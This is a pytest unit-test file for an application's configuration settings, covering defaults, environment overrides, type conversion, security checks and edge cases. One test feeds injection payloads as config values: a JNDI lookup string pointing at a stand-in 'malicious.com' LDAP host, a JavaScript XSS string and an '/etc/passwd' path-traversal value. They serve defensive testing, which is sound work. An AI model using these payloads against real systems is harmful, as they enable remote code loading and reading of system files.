"""
Unit tests for configuration management
"""

import os
from unittest.mock import MagicMock, patch

import pytest

from app.config import Settings


class TestSettingsConfiguration:
    """Test application settings configuration"""

    def test_settings_default_values(self):
        """Test that settings have appropriate default values"""
        with patch.dict(os.environ, {}, clear=True):
            settings = Settings()

            # Database should have a default
            assert hasattr(settings, "database_url")
            # Secret key should be required or have secure default
            assert hasattr(settings, "secret_key")
            # API settings should exist
            assert hasattr(settings, "app_name")

    def test_settings_environment_override(self):
        """Test that environment variables override defaults"""
        test_env = {
            "database_url": "sqlite:///test_override.db",
            "secret_key": "test_secret_override",
            "access_token_expire_minutes": "60",
            "app_name": "Test App",
        }

        with patch.dict(os.environ, test_env, clear=True):
            settings = Settings()

            assert settings.database_url == "sqlite:///test_override.db"
            assert settings.secret_key == "test_secret_override"
            assert settings.access_token_expire_minutes == 60
            assert settings.app_name == "Test App"

    def test_settings_type_conversion(self):
        """Test that environment variables are properly converted to correct types"""
        test_env = {
            "ACCESS_TOKEN_EXPIRE_MINUTES": "120",
            "SINGLE_USER_MODE": "true",
            "DEBUG": "false",
            "BACKUP_RETENTION_DAYS": "14",
        }

        with patch.dict(os.environ, test_env, clear=True):
            settings = Settings()

            # Integer conversion
            assert isinstance(settings.access_token_expire_minutes, int)
            assert settings.access_token_expire_minutes == 120

            # Boolean conversion
            assert isinstance(settings.debug, bool)
            assert settings.debug is False

    def test_settings_required_fields(self):
        """Test that required fields are properly validated"""
        # Test with empty secret_key - should use default
        with patch.dict(os.environ, {"SECRET_KEY": ""}, clear=True):
            settings = Settings()
            # secret_key has a default value, should not be empty
            assert hasattr(settings, "secret_key")
            assert len(settings.secret_key) > 0

    def test_database_url_validation(self):
        """Test database URL validation"""
        valid_urls = [
            "sqlite:///./test.db",
            "postgresql://user:pass@localhost:5432/dbname",
            "mysql://user:pass@localhost:3306/dbname",
        ]

        for url in valid_urls:
            with patch.dict(os.environ, {"DATABASE_URL": url}, clear=True):
                settings = Settings()
                assert settings.database_url == url

    def test_invalid_configuration_values(self):
        """Test handling of invalid configuration values"""
        invalid_configs = [
            {"ACCESS_TOKEN_EXPIRE_MINUTES": "not_a_number"},
            {"BACKUP_RETENTION_DAYS": "-5"},  # Negative days
            {"API_V1_STR": ""},  # Empty API string
        ]

        for invalid_config in invalid_configs:
            with patch.dict(os.environ, invalid_config, clear=True):
                try:
                    settings = Settings()
                    # Should either use defaults or raise validation error
                    field_name = list(invalid_config.keys())[0].lower()
                    assert hasattr(settings, field_name)
                except (ValueError, TypeError):
                    # Validation error is acceptable
                    pass

    def test_security_sensitive_settings(self):
        """Test that security-sensitive settings are handled properly"""
        sensitive_settings = {
            "SECRET_KEY": "very_secret_key_123",
            "DATABASE_PASSWORD": "db_password_123",
            "API_SECRET": "api_secret_123",
        }

        with patch.dict(os.environ, sensitive_settings, clear=True):
            settings = Settings()

            # Ensure sensitive settings are loaded
            if hasattr(settings, "SECRET_KEY"):
                assert settings.SECRET_KEY == "very_secret_key_123"

    def test_path_configurations(self):
        """Test path-related configurations"""
        path_configs = {
            "DATA_DIR": "/custom/data/path",
            "BACKUP_DIR": "/custom/backup/path",
            "LOG_DIR": "/custom/log/path",
        }

        with patch.dict(os.environ, path_configs, clear=True):
            settings = Settings()

            # Check that paths are properly set
            for key, value in path_configs.items():
                if hasattr(settings, key):
                    assert getattr(settings, key) == value

    def test_cors_settings(self):
        """Test CORS configuration settings"""
        # Test comma-separated string format
        cors_config = {
            "CORS_ORIGINS": "http://localhost:3000,http://localhost:8000",
        }

        with patch.dict(os.environ, cors_config, clear=True):
            settings = Settings()
            # Should parse as a list of origins
            assert isinstance(settings.cors_origins, list)
            assert "http://localhost:3000" in settings.cors_origins
            assert "http://localhost:8000" in settings.cors_origins

    def test_feature_flags(self):
        """Test feature flag configurations"""
        feature_flags = {
            "ENABLE_REGISTRATION": "true",
            "ENABLE_API_DOCS": "false",
            "ENABLE_METRICS": "true",
            "SINGLE_USER_MODE": "false",
        }

        with patch.dict(os.environ, feature_flags, clear=True):
            settings = Settings()

            # Feature flags should be boolean values
            for key, value in feature_flags.items():
                if hasattr(settings, key):
                    setting_value = getattr(settings, key)
                    if isinstance(setting_value, bool):
                        expected = value.lower() == "true"
                        assert setting_value == expected

    def test_logging_configuration(self):
        """Test logging-related configuration"""
        logging_configs = {
            "LOG_LEVEL": "DEBUG",
            "LOG_FORMAT": "json",
            "LOG_FILE": "/var/log/daemon.log",
        }

        with patch.dict(os.environ, logging_configs, clear=True):
            settings = Settings()

            # Logging settings should be properly set
            for key, value in logging_configs.items():
                if hasattr(settings, key):
                    assert getattr(settings, key) == value

    def test_performance_settings(self):
        """Test performance-related settings"""
        perf_configs = {
            "MAX_CONNECTIONS": "100",
            "TIMEOUT_SECONDS": "30",
            "RATE_LIMIT_PER_MINUTE": "60",
        }

        with patch.dict(os.environ, perf_configs, clear=True):
            settings = Settings()

            # Performance settings should be integers
            for key, value in perf_configs.items():
                if hasattr(settings, key):
                    setting_value = getattr(settings, key)
                    if isinstance(setting_value, int):
                        assert setting_value == int(value)


class TestConfigurationSecurity:
    """Test security aspects of configuration"""

    def test_secret_key_strength(self):
        """Test that secret keys meet security requirements"""
        weak_keys = ["weak", "123", "password", "secret", "a" * 10]  # Too short

        for weak_key in weak_keys:
            with patch.dict(os.environ, {"SECRET_KEY": weak_key}, clear=True):
                settings = Settings()
                # Implementation should either reject weak keys or use secure defaults
                if hasattr(settings, "SECRET_KEY"):
                    # If weak key is accepted, it should be noted for security review
                    assert len(settings.SECRET_KEY) >= 10

    def test_debug_mode_security(self):
        """Test that debug mode is properly configured"""
        debug_configs = [{"DEBUG": "true"}, {"DEBUG": "false"}, {}]  # Default

        for config in debug_configs:
            with patch.dict(os.environ, config, clear=True):
                settings = Settings()

                if hasattr(settings, "DEBUG"):
                    # In production, DEBUG should be False
                    debug_value = settings.DEBUG
                    # This test documents the expected behavior
                    assert isinstance(debug_value, bool)

    def test_sensitive_data_exposure(self):
        """Test that sensitive configuration data is not inadvertently exposed"""
        sensitive_config = {
            "SECRET_KEY": "super_secret_key",
            "DATABASE_PASSWORD": "db_password",
            "API_SECRET": "api_secret",
        }

        with patch.dict(os.environ, sensitive_config, clear=True):
            settings = Settings()

            # Convert settings to dict/string representation
            settings_dict = (
                settings.dict() if hasattr(settings, "dict") else vars(settings)
            )
            settings_str = str(settings)

            # Sensitive values should be masked or not exposed in string representation
            # This is implementation-dependent, but good practice
            for key, value in sensitive_config.items():
                if hasattr(settings, key):
                    # Document whether sensitive values are exposed
                    actual_value = getattr(settings, key)
                    assert (
                        actual_value == value
                    )  # Value should be accessible programmatically

    def test_configuration_injection_prevention(self):
        """Test prevention of configuration injection attacks"""
        malicious_configs = {
            "SECRET_KEY": "${jndi:ldap://malicious.com/evil}",
            "DATABASE_URL": 'javascript:alert("xss")',
            "LOG_FILE": "../../../etc/passwd",
        }

        with patch.dict(os.environ, malicious_configs, clear=True):
            settings = Settings()

            # Configuration should not execute or interpret malicious values
            for key, malicious_value in malicious_configs.items():
                if hasattr(settings, key):
                    actual_value = getattr(settings, key)
                    # Value should be treated as literal string, not executed
                    assert isinstance(actual_value, str)

    def test_environment_variable_validation(self):
        """Test validation of environment variables"""
        invalid_environments = [
            {"DATABASE_URL": "invalid_url_format"},
            {"ACCESS_TOKEN_EXPIRE_MINUTES": "-1"},
            {"BACKUP_RETENTION_DAYS": "0"},
            {"SECRET_KEY": ""},
        ]

        for invalid_env in invalid_environments:
            with patch.dict(os.environ, invalid_env, clear=True):
                try:
                    settings = Settings()
                    # Should either use safe defaults or raise validation error
                    for key in invalid_env:
                        if hasattr(settings, key):
                            value = getattr(settings, key)
                            # Should have some value (default or validated)
                            assert value is not None
                except (ValueError, TypeError):
                    # Validation errors are acceptable
                    pass


class TestConfigurationDefaults:
    """Test configuration default values"""

    def test_production_ready_defaults(self):
        """Test that default values are suitable for production"""
        with patch.dict(os.environ, {}, clear=True):
            settings = Settings()

            # Check critical production settings
            if hasattr(settings, "DEBUG"):
                # DEBUG should default to False for production
                assert settings.DEBUG is False or settings.DEBUG is None

            if hasattr(settings, "ACCESS_TOKEN_EXPIRE_MINUTES"):
                # Token expiry should be reasonable (not too long)
                assert (
                    15 <= settings.ACCESS_TOKEN_EXPIRE_MINUTES <= 480
                )  # 15 min to 8 hours

    def test_database_defaults(self):
        """Test database configuration defaults"""
        with patch.dict(os.environ, {}, clear=True):
            settings = Settings()

            # Should have a database URL
            assert hasattr(settings, "database_url")
            if settings.database_url:
                # Should be a valid-looking database URL
                assert isinstance(settings.database_url, str)
                assert len(settings.database_url) > 0

    def test_api_defaults(self):
        """Test API configuration defaults"""
        with patch.dict(os.environ, {}, clear=True):
            settings = Settings()

            # API version should be set
            if hasattr(settings, "API_V1_STR"):
                assert isinstance(settings.API_V1_STR, str)
                assert settings.API_V1_STR.startswith("/api")

    def test_backup_defaults(self):
        """Test backup configuration defaults"""
        with patch.dict(os.environ, {}, clear=True):
            settings = Settings()

            # Backup retention should be reasonable
            if hasattr(settings, "BACKUP_RETENTION_DAYS"):
                assert isinstance(settings.BACKUP_RETENTION_DAYS, int)
                assert 1 <= settings.BACKUP_RETENTION_DAYS <= 365


class TestConfigurationEdgeCases:
    """Test edge cases in configuration"""

    def test_empty_environment_variables(self):
        """Test handling of empty environment variables"""
        empty_env = {"SECRET_KEY": "", "DATABASE_URL": "", "API_V1_STR": ""}

        with patch.dict(os.environ, empty_env, clear=True):
            try:
                settings = Settings()
                # Should handle empty values gracefully
                for key in empty_env:
                    if hasattr(settings, key):
                        value = getattr(settings, key)
                        # Should either use default or handle empty appropriately
                        assert value is not None or key in [
                            "DEBUG"
                        ]  # Some fields can be None
            except (ValueError, TypeError):
                # Validation errors for empty required fields are acceptable
                pass

    def test_unicode_in_configuration(self):
        """Test handling of unicode in configuration values"""
        unicode_config = {
            "APP_NAME": "Dæmon API 🚀",
            "LOG_FILE": "/var/log/dæmon.log",
            "DATA_DIR": "/données/app",
        }

        with patch.dict(os.environ, unicode_config, clear=True):
            settings = Settings()

            # Unicode should be handled properly
            for key, value in unicode_config.items():
                if hasattr(settings, key):
                    actual_value = getattr(settings, key)
                    assert actual_value == value

    def test_very_long_configuration_values(self):
        """Test handling of very long configuration values"""
        long_values = {
            "DATABASE_URL": "postgresql://very_long_username:"
            + "a" * 1000
            + "@localhost:5432/db",
            "SECRET_KEY": "b" * 1000,
            "LOG_FILE": "/very/long/path/" + "c" * 500 + "/logfile.log",
        }

        with patch.dict(os.environ, long_values, clear=True):
            settings = Settings()

            # Should handle long values without errors
            for key, value in long_values.items():
                if hasattr(settings, key):
                    actual_value = getattr(settings, key)
                    assert isinstance(actual_value, str)

    def test_special_characters_in_configuration(self):
        """Test handling of special characters in configuration"""
        special_chars_config = {
            "SECRET_KEY": "key!@#$%^&*()_+-=[]{}|;:,.<>?",
            "DATABASE_PASSWORD": "pass\"word'with`quotes",
            "LOG_FORMAT": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        }

        with patch.dict(os.environ, special_chars_config, clear=True):
            settings = Settings()

            # Special characters should be preserved
            for key, value in special_chars_config.items():
                if hasattr(settings, key):
                    actual_value = getattr(settings, key)
                    assert actual_value == value
